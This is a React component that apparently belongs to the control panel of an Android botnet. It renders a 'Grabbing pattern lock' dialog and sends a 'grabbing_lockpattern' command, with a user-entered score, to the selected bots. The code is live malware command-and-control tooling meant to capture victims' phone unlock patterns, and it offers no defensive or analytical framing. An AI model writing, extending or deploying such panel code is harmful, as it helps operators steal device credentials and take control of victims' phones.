import React from 'react';
import SettingsContext from '../../Settings';
import { try_eval } from '../../serviceF';

class Grabbing_lockpattern extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          score: '',
          checked: false
        }
    }
    onChangeScore = (e) => {
        this.setState({ 
            score: e.target.value
        });
    }

    onSendRequest = (e) => {
        if(SettingsContext.BotsSelected()) {
            try_eval('$.notify("Added command [grabbing_lockpattern]", "info");');
            SettingsContext.BotSendCommand('{"cmd":"grabbing_lockpattern","score":"' + this.state.score + '"}');
            this.setState({ 
                score: ''
            });
        }
    }

    render () {
        return (
            <React.Fragment>
                <div class="modal fade" id="modalgrabbing_lockpattern" tabindex="-1" role="dialog" aria-labelledby="modalgrabbing_lockpattern" aria-hidden="true">
                    <div class="modal-dialog" role="document">
                        <div class="modal-content">
                            <div class="modalClose">
                                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                                    <span aria-hidden="true">&times;</span>
                                </button>
                            </div>  

                            <h5 class="modalTitle">Grabbing pattern lock</h5>

                            <div class="modal-body">
                                <input class="form-control" id="inp_score" value={this.state.score} onChange={this.onChangeScore} placeholder="Score for example 15" />
                            </div>
                            <div class = "modalFooter">
                                <button type="button" onClick={this.onSendRequest} class="btn btn-outline-primary"  data-dismiss="modal">Send command</button>
                            </div>
                        </div>
                    </div>
                </div>

            </React.Fragment>
        );
    }
}

export default Grabbing_lockpattern;